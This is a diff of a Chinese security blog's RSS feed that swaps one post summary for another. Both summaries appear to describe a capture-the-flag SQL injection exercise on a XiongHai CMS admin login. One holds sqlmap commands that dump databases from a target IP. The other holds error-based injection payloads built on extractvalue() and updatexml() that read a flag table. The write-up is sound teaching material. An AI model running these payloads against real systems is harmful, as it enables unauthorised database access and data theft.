@@ -14,7 +14,7 @@
       <link>https://xxxhidexxx.github.io/posts/sec/sqli4/</link>
       <pubDate>Mon, 12 Feb 2024 00:00:00 +0000</pubDate>
       <guid>https://xxxhidexxx.github.io/posts/sec/sqli4/</guid>
-      <description>手工注入 用 sqlmap 扫描 使用的 sqlmap 语句如下。&amp;ndash;forms 是对登录框的表单进行扫描，如果这个 forms 指令行不通，可以考虑抓包到 txt 用 -r 扫描。&#xA;sqlmap -u http://111.9.41.91:53008/admin/?r=index --forms --batch --dbs&#xD;&amp;ndash;dbs 的意思是列出所有数据库名称&#xA;sqlmap -u http://111.9.41.91:53008/admin/?r=index --forms --batch -D flag_db --dump&#xD;-D 是指定数据库，&amp;ndash;dump 是以文件形式导出。</description>
+      <description>这是一个基于熊海 cms 的靶场，并且提示我们存在 post 注入。打开 burp 抓个包，用 burp 目标里面的目录扫描找到了后台 /admin，打开得到管理员登录界面。&#xA;有必要说的是，这个登录页面是个弱口令，但是急于用弱口令登录进去就会错过外面这个登录页面的漏洞。&#xA;最终我们发现这个登录页面存在 sql 注入，可以在不登录的情况下借助外带的语法报错拿到数据库信息。&#xA;语法回顾 我们使用 extractvalue() 和 concat() 这两个函数引起报错。&#xA;extractvalue(xml_frag,xpath_expr) 是 mysql 的 xml 函数，有两个字符串参数，我们写 extractvalue(1,concat(&amp;hellip;)) 就可以了。concat() 就是拼接字符串，我们写一个 0x5c 或者 0x7e 就会引起路径错误，payload 如下。&#xA;1&#39; and extractvalue(1,concat(&#xD;0x5c,&#xD;0x7e,&#xD;(select value from flag_db.flag limit 0,1),&#xD;0x7e&#xD;)) and &#39;1&#39;=&#39;1&#xD;同样是 xml 函数的 updatexml() 可以替代 extractvalue()，payload 如下。&#xA;1&#39; and updatexml(1,concat(&#xD;0x5c,&#xD;0x7e,&#xD;(select value from flag_db.flag limit 0,1)，&#xD;0x7e&#xD;),1) and &#39;1&#39;=&#39;1&#xD;在这两个 xml 函数用不了的时候用 floor() 报错也可以，但是写起来会比较麻烦，payload 如下。</description>
     </item>
     <item>
       <title>Kali Linux 网络设置</title>
